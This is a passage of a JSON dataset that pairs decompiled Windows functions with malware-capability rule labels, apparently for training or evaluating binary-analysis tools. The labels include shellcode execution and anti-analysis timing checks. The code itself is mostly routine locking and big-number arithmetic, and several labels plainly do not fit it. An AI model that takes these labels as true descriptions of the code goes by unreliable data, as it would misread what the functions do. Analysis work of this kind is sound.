    "14001039": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid fcn.140010390(ulong param_1, ulong param_2)\n\n{\n    uint32_t uVar1;\n    uchar auStack12 [12];\n    \n    uVar1 = fcn.140010f20(param_1, param_2, 0x1400160c0, auStack12);\n    // switch table (6 cases) at 0x140017f50\n    switch(uVar1 & 7) {\n    case 1:\n    case 5:\n        break;\n    case 2:\n        break;\n    case 3:\n        break;\n    case 4:\n    }\n    return;\n}\n",
        "token_count": 137
    },
    "14001043": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 * fcn.140010430(float10 *arg1, ulong arg2, ulong arg3)\n\n{\n    uint32_t uVar1;\n    int16_t aiStack36 [2];\n    ulong uStack32;\n    uchar auStack24 [16];\n    \n    auStack24._0_10_ = 0;\n    uVar1 = fcn.140010f20(arg2, arg3, 0x1400160e0, aiStack36);\n    // switch table (6 cases) at 0x140017f70\n    switch(uVar1 & 7) {\n    case 1:\n    case 5:\n        auStack24._0_10_ = CONCAT28(aiStack36[0] + 0x403e, auStack24._0_8_);\n    case 2:\n        auStack24._0_10_ = CONCAT28(auStack24._8_2_, uStack32);\n        break;\n    case 3:\n        auStack24._0_10_ = CONCAT46(0x7fff8000, auStack24._0_6_);\n        if ((uVar1 & 8) == 0) goto code_r0x0001400104a5;\n        goto code_r0x00014001049e;\n    case 4:\n        auStack24._0_10_ = CONCAT46(0x7fffc000, auStack24._0_6_);\n    }\n    if ((uVar1 & 8) != 0) {\ncode_r0x00014001049e:\n        auStack24._0_10_ = auStack24._0_10_ | 0x8000;\n    }\ncode_r0x0001400104a5:\n    *arg1 = auStack24._0_10_;\n    return arg1;\n}\n",
        "token_count": 403
    },
    "14000ba5": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t fcn.14000ba50(int32_t **arg1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    ulong uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    if ((arg1 == NULL) || (piVar2 = *arg1,  piVar2 == NULL)) {\n        return 0x16;\n    }\n    if (piVar2 == 0xffffffffffffffff) {\n        return 0;\n    }\n    iVar4 = 0x16;\n    if (*piVar2 == -0x3f454e03) {\n        piVar1 = piVar2 + 6;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(piVar1);\n        iVar4 = piVar2[3];\n        if (iVar4 == 0) {\n            if (piVar2[2] != piVar2[4] && piVar2[4] <= piVar2[2]) {\n                iVar4 = fcn.14000b760(*(piVar2 + 0x2a), 1, 0xffffffff, piVar2 + 0x1c);\n                if (iVar4 == 0) {\n                    iVar4 = piVar2[4];\n                    iVar5 = piVar2[2];\n                    if (iVar4 != 0) {\n                        piVar2[4] = 0;\n                        iVar5 = iVar5 - iVar4;\n                    }\n                    piVar2[3] = 1;\n                    piVar2[2] = iVar5 + -1;\n                    goto code_r0x00014000aec0;\n                }\n            }\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(piVar1);\n        }\n        else {\n            if (piVar2[2] != 0) {\n                piVar2[2] = piVar2[2] + -1;\n                piVar2[3] = iVar4 + 1;\ncode_r0x00014000aec0:\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(piVar1);\n                uVar3 = *(piVar2 + 0x28);\n                piVar1 = piVar2 + 0x1a;\n                piVar2 = piVar2 + 0x10;\n                (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(piVar2);\n                iVar4 = *piVar1;\n                if (0x7fffffff < iVar4 + 1) {\n                    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(piVar2);\n                    return 0x22;\n                }\n                LOCK();\n                *piVar1 = *piVar1 + 1;\n                if (iVar4 < 0) {\n                    iVar5 = -iVar4;\n                    if (1 < -iVar4) {\n                        iVar5 = 1;\n                    }\n                    iVar4 = (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(uVar3, iVar5, 0);\n                    if (iVar4 == 0) {\n                        LOCK();\n                        *piVar1 = *piVar1 + -1;\n                        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(piVar2);\n                        return 0x16;\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(piVar2);\n                return 0;\n            }\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(piVar1);\n            iVar4 = 0;\n        }\n    }\n    return iVar4;\n}\n",
        "token_count": 758
    },
    "14000bce": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint64_t fcn.14000bce0(int32_t **arg1, ulong arg2)\n\n{\n    int32_t *arg4;\n    code *pcVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    ulong *puVar4;\n    int64_t *piVar5;\n    int32_t *piVar6;\n    uint32_t uStack124;\n    int32_t *piStack120;\n    ulong uStack112;\n    uint32_t *puStack104;\n    code *pcStack88;\n    int32_t **ppiStack80;\n    ulong uStack72;\n    \n    if (arg1 == NULL) {\n        return 0x16;\n    }\n    piVar6 = *arg1;\n    uVar3 = 0x16;\n    if (piVar6 != NULL) {\n        if (piVar6 == 0xffffffffffffffff) {\n            uVar3 = fcn.14000b330(arg1);\n            uStack124 = uVar3;\n            if ((uVar3 & 0xffffffef) != 0) {\n                return uVar3;\n            }\n            piVar6 = *arg1;\n        }\n        else if (*piVar6 != -0x3f454e03) {\n            return 0x16;\n        }\n        pcVar1 = _sym.imp.KERNEL32.dll_TryEnterCriticalSection;\n        arg4 = piVar6 + 0x1c;\n        while( true ) {\n            uVar3 = fcn.14000b760(*(piVar6 + 0x2a), 0, 0xffffffff, arg4);\n            uStack124 = uVar3;\n            if (uStack124 != 0) break;\n            iVar2 = (*pcVar1)(piVar6 + 6);\n            if (iVar2 != 0) {\n                piVar6[2] = piVar6[2] + 1;\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(piVar6 + 6);\n                uVar3 = fcn.14000aec0(*(piVar6 + 0x2a), 1, arg4, piVar6 + 0x26);\n                uStack124 = uVar3;\n                if (uStack124 != 0) {\n                    return uVar3;\n                }\n                puStack104 = &uStack124;\n                pcStack88 = 0x14000bec0;\n                ppiStack80 = &piStack120;\n                piStack120 = piVar6;\n                uStack112 = arg2;\n                puVar4 = fcn.1400073c0();\n                uStack72 = *puVar4;\n                piVar5 = fcn.1400073c0();\n                *piVar5 = &pcStack88;\n                uStack124 = fcn.140009910(arg2);\n                if (uStack124 == 0) {\n                    uStack124 = fcn.14000b760(*(piVar6 + 0x28), 0, 0xffffffff, piVar6 + 0x10);\n                }\n                puVar4 = fcn.1400073c0();\n                *puVar4 = uStack72;\n                (*pcStack88)(ppiStack80);\n                return uStack124;\n            }\n            uVar3 = fcn.14000aec0(*(piVar6 + 0x2a), 1, arg4, piVar6 + 0x26);\n            uStack124 = uVar3;\n            if (uStack124 != 0) {\n                return uVar3;\n            }\n            fcn.14000c620();\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 797
    },
    "14000c25": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00014000c0e0)\n\nuint64_t fcn.14000c250(int32_t **arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t *arg4;\n    code *pcVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    ulong *puVar4;\n    int64_t *piVar5;\n    int32_t *piVar6;\n    uint64_t arg3_00;\n    uint32_t uStack124;\n    int32_t *piStack120;\n    ulong uStack112;\n    uint32_t *puStack104;\n    code *pcStack88;\n    int32_t **ppiStack80;\n    ulong uStack72;\n    \n    if (arg1 == NULL) {\n        return 0x16;\n    }\n    piVar6 = *arg1;\n    uVar3 = 0x16;\n    if (piVar6 != NULL) {\n        if (piVar6 == 0xffffffffffffffff) {\n            uVar3 = fcn.14000b330(arg1);\n            uStack124 = uVar3;\n            if ((uVar3 & 0xffffffef) != 0) {\n                return uVar3;\n            }\n            piVar6 = *arg1;\n        }\n        else if (*piVar6 != -0x3f454e03) {\n            return 0x16;\n        }\n        uVar3 = fcn.140009390(arg3);\n        pcVar1 = _sym.imp.KERNEL32.dll_TryEnterCriticalSection;\n        arg3_00 = uVar3 & 0xffffffff;\n        if (0xfffffffe < uVar3) {\n            arg3_00 = 0xffffffff;\n        }\n        arg4 = piVar6 + 0x1c;\n        while( true ) {\n            uVar3 = fcn.14000b760(*(piVar6 + 0x2a), 0, 0xffffffff, arg4);\n            uStack124 = uVar3;\n            if (uStack124 != 0) break;\n            iVar2 = (*pcVar1)(piVar6 + 6);\n            if (iVar2 != 0) {\n                piVar6[2] = piVar6[2] + 1;\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(piVar6 + 6);\n                uVar3 = fcn.14000aec0(*(piVar6 + 0x2a), 1, arg4, piVar6 + 0x26);\n                uStack124 = uVar3;\n                if (uStack124 != 0) {\n                    return uVar3;\n                }\n                puStack104 = &uStack124;\n                pcStack88 = 0x14000bec0;\n                ppiStack80 = &piStack120;\n                piStack120 = piVar6;\n                uStack112 = arg2;\n                puVar4 = fcn.1400073c0();\n                uStack72 = *puVar4;\n                piVar5 = fcn.1400073c0();\n                *piVar5 = &pcStack88;\n                uStack124 = fcn.140009910(arg2);\n                if (uStack124 == 0) {\n                    uStack124 = fcn.14000b760(*(piVar6 + 0x28), 0, arg3_00, piVar6 + 0x10);\n                }\n                puVar4 = fcn.1400073c0();\n                *puVar4 = uStack72;\n                (*pcStack88)(ppiStack80);\n                return uStack124;\n            }\n            uVar3 = fcn.14000aec0(*(piVar6 + 0x2a), 1, arg4, piVar6 + 0x26);\n            uStack124 = uVar3;\n            if (uStack124 != 0) {\n                return uVar3;\n            }\n            fcn.14000c620();\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 881
    },
    "14000936": {
        "rules": [
            "encrypt data using HC-128/96968cc2d377418d85ec89c0278a8523"
        ],
        "decompiled_code": "\nint64_t fcn.140009360(int64_t *arg1)\n\n{\n    return (*(arg1 + 1) + 999999) / 1000000 + *arg1 * 1000;\n}\n",
        "token_count": 47
    },
    "140010e1": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nint64_t fcn.140010e10(int64_t arg1, ulong arg2)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    uint32_t uVar5;\n    int64_t iVar6;\n    \n    uVar5 = arg2 + 0x1f >> 5;\n    if (*(arg1 + 8) < uVar5) {\n        fcn.140013d90(arg1);\n        arg1 = fcn.140013c90(uVar5);\n    }\n    uVar4 = arg1 + 0x18;\n    iVar2 = arg2 >> 5;\n    if ((arg2 & 0x1f) == 0) {\n        *(arg1 + 0x14) = iVar2;\n        uVar1 = uVar4 + iVar2 * 4;\n        if (uVar4 < uVar1) {\n            iVar6 = ((uVar1 - arg1) - 0x19 & 0xfffffffffffffffc) + 4;\n            if (uVar1 < arg1 + 0x19U) {\n                iVar6 = 4;\n            }\n            sub.msvcrt.dll_memset(uVar4, 0xff, iVar6);\n            return arg1;\n        }\n    }\n    else {\n        *(arg1 + 0x14) = iVar2 + 1;\n        uVar1 = uVar4 + (iVar2 + 1) * 4;\n        if (uVar4 < uVar1) {\n            iVar6 = ((uVar1 - arg1) - 0x19 & 0xfffffffffffffffc) + 4;\n            if (uVar1 < arg1 + 0x19U) {\n                iVar6 = 4;\n            }\n            iVar3 = sub.msvcrt.dll_memset(uVar4, 0xff, iVar6);\n            uVar4 = iVar3 + iVar6;\n        }\n        *(uVar4 - 4) = *(uVar4 - 4) >> (0x20U - (arg2 & 0x1f) & 0x1f);\n    }\n    return arg1;\n}\n",
        "token_count": 482
    },
    "140012ab": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nint64_t fcn.140012ab0(int64_t arg1, int64_t arg2)\n\n{\n    ushort *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int64_t arg1_00;\n    ushort *puVar6;\n    int64_t iVar7;\n    ushort *puVar8;\n    ushort *puVar9;\n    uint32_t uVar10;\n    int64_t iVar11;\n    uint32_t *puVar12;\n    \n    iVar7 = arg1;\n    if (*(arg1 + 0x14) < *(arg2 + 0x14)) {\n        iVar7 = arg2;\n        arg2 = arg1;\n    }\n    uVar10 = 0;\n    arg1_00 = fcn.140013c90(*(iVar7 + 8));\n    iVar2 = *(iVar7 + 0x14);\n    iVar11 = 0x18;\n    puVar6 = arg1_00 + 0x18;\n    *(arg1_00 + 0x14) = iVar2;\n    iVar3 = *(arg2 + 0x14);\n    puVar1 = puVar6 + iVar3 * 2;\n    puVar8 = puVar6;\n    do {\n        uVar4 = *(iVar7 + iVar11);\n        uVar5 = *(arg2 + iVar11);\n        puVar9 = puVar8 + 2;\n        iVar11 = iVar11 + 4;\n        uVar10 = (uVar4 & 0xffff) + (uVar5 & 0xffff) + uVar10;\n        *puVar8 = uVar10;\n        uVar10 = (uVar4 >> 0x10) + (uVar5 >> 0x10) + (uVar10 >> 0x10);\n        puVar8[1] = uVar10;\n        uVar10 = uVar10 >> 0x10;\n        puVar8 = puVar9;\n    } while (puVar9 < puVar1);\n    iVar11 = (puVar1 + (-0x19 - arg1_00) & 0xfffffffffffffffcU) + 4;\n    if (puVar1 < arg1_00 + 0x19U) {\n        iVar11 = 4;\n    }\n    puVar12 = iVar7 + 0x18 + iVar11;\n    for (puVar6 = iVar11 + puVar6; puVar6 < puVar1 + (iVar2 - iVar3) * 2; puVar6 = puVar6 + 2) {\n        uVar4 = *puVar12;\n        puVar12 = puVar12 + 1;\n        uVar10 = (uVar4 & 0xffff) + uVar10;\n        *puVar6 = uVar10;\n        uVar10 = (uVar4 >> 0x10) + (uVar10 >> 0x10);\n        puVar6[1] = uVar10;\n        uVar10 = uVar10 >> 0x10;\n    }\n    iVar7 = arg1_00;\n    if (uVar10 != 0) {\n        if (iVar2 == *(arg1_00 + 0xc)) {\n            iVar7 = fcn.140013c90(*(arg1_00 + 8) + 1);\n            sub.msvcrt.dll_memcpy(iVar7 + 0x10, arg1_00 + 0x10, *(arg1_00 + 0x14) * 4 + 8);\n            fcn.140013d90(arg1_00);\n            iVar2 = *(iVar7 + 0x14);\n        }\n        *(iVar7 + 0x14) = iVar2 + 1;\n        *(iVar7 + 0x18 + iVar2 * 4) = 1;\n    }\n    return iVar7;\n}\n",
        "token_count": 861
    },
    "140013f7": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nint64_t fcn.140013f70(int64_t arg1, int64_t arg2)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int64_t iVar7;\n    uint32_t *puVar8;\n    uint64_t uVar9;\n    uint32_t *puVar10;\n    uint32_t *puVar11;\n    int32_t iVar12;\n    uint32_t *puVar13;\n    uint64_t uVar14;\n    uint32_t *puVar15;\n    int64_t iVar16;\n    \n    iVar12 = *(arg1 + 0x14);\n    iVar3 = *(arg2 + 0x14);\n    iVar16 = arg1;\n    iVar6 = iVar12;\n    if (iVar3 <= iVar12) {\n        iVar16 = arg2;\n        arg2 = arg1;\n        iVar6 = iVar3;\n        iVar3 = iVar12;\n    }\n    iVar12 = iVar3 + iVar6;\n    iVar7 = fcn.140013c90((*(arg2 + 0xc) < iVar12) + *(arg2 + 8));\n    if (iVar7 != 0) {\n        puVar8 = iVar7 + 0x18;\n        puVar13 = puVar8 + iVar12;\n        if (puVar8 < puVar13) {\n            puVar8 = sub.msvcrt.dll_memset(puVar8, 0);\n        }\n        puVar15 = iVar16 + 0x18;\n        puVar1 = puVar15 + iVar6;\n        puVar2 = arg2 + 0x18 + iVar3;\n        if (puVar15 < puVar1) {\n            iVar16 = (puVar2 + (-0x19 - arg2) & 0xfffffffffffffffcU) + 4;\n            if (puVar2 < arg2 + 0x19) {\n                iVar16 = 4;\n            }\n            do {\n                while( true ) {\n                    uVar4 = *puVar15;\n                    puVar15 = puVar15 + 1;\n                    if (uVar4 == 0) break;\n                    uVar14 = 0;\n                    puVar10 = puVar8;\n                    puVar11 = arg2 + 0x18;\n                    do {\n                        uVar5 = *puVar11;\n                        puVar11 = puVar11 + 1;\n                        uVar9 = uVar5 * uVar4 + *puVar10 + uVar14;\n                        *puVar10 = uVar9;\n                        uVar14 = uVar9 >> 0x20;\n                        puVar10 = puVar10 + 1;\n                    } while (puVar11 < puVar2);\n                    *(puVar8 + iVar16) = uVar9 >> 0x20;\n                    puVar8 = puVar8 + 1;\n                    if (puVar1 <= puVar15) goto code_r0x000140014093;\n                }\n                puVar8 = puVar8 + 1;\n            } while (puVar15 < puVar1);\n        }\ncode_r0x000140014093:\n        if (0 < iVar12) {\n            do {\n                puVar8 = puVar13 + -1;\n                puVar13 = puVar13 + -1;\n                if (*puVar8 != 0) break;\n                iVar12 = iVar12 + -1;\n            } while (iVar12 != 0);\n        }\n        *(iVar7 + 0x14) = iVar12;\n    }\n    return iVar7;\n}\n",
        "token_count": 802
    },
    "1400142d": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nint64_t fcn.1400142d0(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint8_t uVar7;\n    int32_t iVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    uint64_t arg1_00;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    uint32_t *puVar14;\n    uint32_t *puVar15;\n    uint32_t *puVar16;\n    uint32_t *puVar17;\n    \n    arg1_00 = *(arg1 + 8);\n    iVar13 = arg2 >> 5;\n    iVar12 = *(arg1 + 0x14) + iVar13;\n    iVar1 = iVar12 + 1;\n    iVar8 = *(arg1 + 0xc);\n    if (*(arg1 + 0xc) < iVar1) {\n        do {\n            iVar6 = iVar8 * 2;\n            arg1_00 = arg1_00 + 1;\n            iVar5 = iVar8 * -2;\n            iVar8 = iVar6;\n        } while (iVar1 != iVar6 && SBORROW4(iVar1, iVar6) == iVar1 + iVar5 < 0);\n    }\n    iVar9 = fcn.140013c90(arg1_00);\n    if (iVar9 != 0) {\n        puVar2 = iVar9 + 0x18;\n        puVar16 = puVar2;\n        if (0 < iVar13) {\n            puVar16 = puVar2 + iVar13;\n            sub.msvcrt.dll_memset(puVar2, 0, iVar13 * 4);\n        }\n        puVar15 = arg1 + 0x18;\n        puVar2 = puVar15 + *(arg1 + 0x14);\n        uVar7 = arg2 & 0x1f;\n        if ((arg2 & 0x1f) == 0) {\n            do {\n                puVar14 = puVar16 + 1;\n                puVar17 = puVar15 + 1;\n                *puVar16 = *puVar15;\n                if (puVar2 <= puVar17) break;\n                puVar16 = puVar16 + 2;\n                puVar15 = puVar15 + 2;\n                *puVar14 = *puVar17;\n            } while (puVar15 < puVar2);\n        }\n        else {\n            uVar11 = 0;\n            puVar17 = puVar16;\n            do {\n                puVar14 = puVar15 + 1;\n                *puVar17 = *puVar15 << uVar7 | uVar11;\n                uVar3 = *puVar15;\n                uVar4 = 0x20 - uVar7 & 0x1f;\n                uVar11 = uVar3 >> uVar4;\n                puVar15 = puVar14;\n                puVar17 = puVar17 + 1;\n            } while (puVar14 < puVar2);\n            iVar10 = (puVar2 + (-0x19 - arg1) & 0xfffffffffffffffcU) + 4;\n            if (puVar2 < arg1 + 0x19U) {\n                iVar10 = 4;\n            }\n            if (uVar3 >> uVar4 != 0) {\n                iVar12 = iVar1;\n            }\n            *(puVar16 + iVar10) = uVar11;\n        }\n        *(iVar9 + 0x14) = iVar12;\n        fcn.140013d90(arg1);\n    }\n    return iVar9;\n}\n",
        "token_count": 833
    },
    "140014a4": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid fcn.140014a40(uint *arg1, ulong arg2, int64_t arg3)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *puVar5;\n    \n    puVar4 = arg3 + 0x18;\n    puVar1 = arg1 + ((arg2 + -1 >> 5) + 1);\n    puVar2 = puVar4 + *(arg3 + 0x14);\n    puVar5 = arg1;\n    if (puVar4 < puVar2) {\n        do {\n            puVar3 = puVar4 + 1;\n            *puVar5 = *puVar4;\n            puVar4 = puVar3;\n            puVar5 = puVar5 + 1;\n        } while (puVar3 < puVar2);\n        arg1 = arg1 + (puVar2 + (-0x19 - arg3) & 0xfffffffffffffffcU) + 4;\n    }\n    if (puVar1 <= arg1) {\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x000140014b80. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.msvcrt.dll_memset)(arg1, 0, (puVar1 + (-1 - arg1) & 0xfffffffffffffffcU) + 4);\n    return;\n}\n",
        "token_count": 323
    },
    "14001357": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.140013570(int64_t arg1, ulong arg2)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    int8_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t *puVar7;\n    uint32_t *puVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    uint32_t *puVar11;\n    \n    iVar9 = *(arg1 + 0x14);\n    if (arg2 >> 5 < *(arg1 + 0x14)) {\n        puVar1 = arg1 + 0x18;\n        iVar10 = arg2 >> 5;\n        puVar2 = puVar1 + iVar9;\n        puVar7 = puVar1 + iVar10;\n        if ((arg2 & 0x1f) == 0) {\n            puVar11 = puVar1;\n            if (puVar2 <= puVar7) goto code_r0x000140013608;\n            do {\n                puVar8 = puVar7 + 1;\n                *puVar11 = *puVar7;\n                puVar7 = puVar8;\n                puVar11 = puVar11 + 1;\n            } while (puVar8 < puVar2);\n            puVar7 = puVar1 + (iVar9 - iVar10);\n        }\n        else {\n            uVar3 = *puVar7;\n            puVar7 = puVar7 + 1;\n            iVar4 = arg2 & 0x1f;\n            uVar5 = uVar3 >> iVar4;\n            puVar11 = puVar1;\n            if (puVar7 < puVar2) {\n                do {\n                    puVar8 = puVar7 + 1;\n                    *puVar11 = *puVar7 << (0x20U - iVar4 & 0x1f) | uVar5;\n                    uVar3 = *puVar7;\n                    uVar5 = uVar3 >> iVar4;\n                    puVar7 = puVar8;\n                    puVar11 = puVar11 + 1;\n                } while (puVar8 < puVar2);\n                puVar7 = arg1 + 0x14 + (iVar9 - iVar10) * 4;\n                *puVar7 = uVar5;\n                if (uVar3 >> iVar4 == 0) goto code_r0x00014001363d;\n            }\n            else {\n                *(arg1 + 0x18) = uVar5;\n                puVar7 = puVar1;\n                if (uVar3 >> iVar4 == 0) goto code_r0x000140013608;\n            }\n            puVar7 = puVar7 + 1;\n        }\ncode_r0x00014001363d:\n        iVar6 = puVar7 - puVar1 >> 2;\n        *(arg1 + 0x14) = iVar6;\n        if (iVar6 != 0) {\n            return;\n        }\n    }\n    else {\ncode_r0x000140013608:\n        *(arg1 + 0x14) = 0;\n    }\n    *(arg1 + 0x18) = 0;\n    return;\n}\n",
        "token_count": 712
    },
    "140014ab": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nulong fcn.140014ab0(int64_t arg1, ulong arg2)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    int8_t iVar5;\n    int32_t iVar6;\n    \n    puVar1 = arg1 + 0x18;\n    iVar3 = *(arg1 + 0x14);\n    iVar6 = arg2 >> 5;\n    if (iVar3 < iVar6) {\n        puVar4 = puVar1 + iVar3;\n    }\n    else {\n        puVar4 = puVar1 + iVar6;\n        if (((iVar6 < iVar3) && ((arg2 & 0x1f) != 0)) && (iVar5 = arg2 & 0x1f,  *puVar4 != (*puVar4 >> iVar5) << iVar5))\n        {\n            return 1;\n        }\n    }\n    do {\n        if (puVar4 <= puVar1) {\n            return 0;\n        }\n        puVar2 = puVar4 + -1;\n        puVar4 = puVar4 + -1;\n    } while (*puVar2 == 0);\n    return 1;\n}\n",
        "token_count": 274
    },
    "14001495": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nint32_t fcn.140014950(int64_t arg1, int64_t arg2)\n\n{\n    int32_t iStack48;\n    int32_t aiStack44 [3];\n    \n    fcn.140014600(arg1, &iStack48);\n    fcn.140014600(arg2, aiStack44);\n    return (((*(arg1 + 0x14) - *(arg2 + 0x14)) * 0x20 + iStack48) - aiStack44[0]) * 0x100000;\n}\n",
        "token_count": 118
    },
    "1400143e": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t fcn.1400143e0(int64_t arg1, int64_t arg2)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    \n    iVar1 = *(arg2 + 0x14);\n    uVar4 = *(arg1 + 0x14) - iVar1;\n    if (uVar4 == 0) {\n        puVar2 = arg1 + 0x18 + iVar1;\n        puVar3 = arg2 + 0x18 + iVar1 * 4;\n        do {\n            puVar2 = puVar2 + -1;\n            puVar3 = puVar3 + -1;\n            if (*puVar2 != *puVar3) {\n                return -(*puVar2 < *puVar3) | 1;\n            }\n        } while (arg1 + 0x18 < puVar2);\n    }\n    return uVar4;\n}\n",
        "token_count": 220
    },
    "14001460": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint64_t fcn.140014600(int64_t arg1, int32_t *arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    uint8_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    \n    uVar1 = arg1 + 0x18;\n    iVar2 = uVar1 + *(arg1 + 0x14) * 4;\n    uVar3 = *(iVar2 + -4);\n    uVar6 = 0x1f;\n    if (uVar3 != 0) {\n        for (; uVar3 >> uVar6 == 0; uVar6 = uVar6 - 1) {\n        }\n    }\n    uVar6 = uVar6 ^ 0x1f;\n    *arg2 = 0x20 - uVar6;\n    if (uVar6 < 0xb) {\n        uVar8 = 0;\n        uVar5 = 0xb - uVar6;\n        if (uVar1 < iVar2 - 4U) {\n            uVar8 = *(iVar2 + -8) >> (uVar5 & 0x1f);\n        }\n        return CONCAT44(uVar3 >> (uVar5 & 0x1f), uVar3 << (uVar6 + 0x15U & 0x1f) | uVar8) | 0x3ff0000000000000;\n    }\n    iVar7 = uVar6 - 0xb;\n    uVar5 = iVar7;\n    if (uVar1 < iVar2 - 4U) {\n        uVar6 = *(iVar2 + -8);\n        uVar4 = uVar6;\n        if (iVar7 == 0) {\ncode_r0x0001400146a7:\n            return (uVar3 | 0x3ff00000) << 0x20 | uVar4;\n        }\n        uVar8 = uVar6 << (uVar5 & 0x1f);\n        uVar9 = uVar8;\n        uVar4 = (uVar3 << (uVar5 & 0x1f) | uVar6 >> (-uVar5 & 0x1f) | 0x3ff00000) << 0x20;\n        if (uVar1 < iVar2 - 8U) {\n            uVar9 = uVar8 | *(iVar2 + -0xc) >> (-uVar5 & 0x1f);\n        }\n    }\n    else {\n        uVar4 = 0;\n        if (iVar7 == 0) goto code_r0x0001400146a7;\n        uVar9 = 0;\n        uVar4 = (uVar3 << (uVar5 & 0x1f) | 0x3ff00000) << 0x20;\n    }\n    return uVar4 | uVar9;\n}\n",
        "token_count": 677
    },
    "140002a6": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.140002a60(ulong arg1)\n\n{\n    uint64_t in_RAX;\n    uint64_t uVar1;\n    ulong *puVar2;\n    ulong auStackX8 [4];\n    uint64_t uStack16;\n    \n    puVar2 = auStackX8;\n    uVar1 = in_RAX;\n    if (0xfff < in_RAX) {\n        do {\n            puVar2 = puVar2 + -0x200;\n            *puVar2 = *puVar2;\n            uVar1 = uVar1 - 0x1000;\n        } while (0x1000 < uVar1);\n    }\n    uStack16 = in_RAX;\n    *(puVar2 - uVar1) = *(puVar2 - uVar1);\n    return uStack16;\n}\n",
        "token_count": 182
    },
    "14000aec": {
        "rules": [
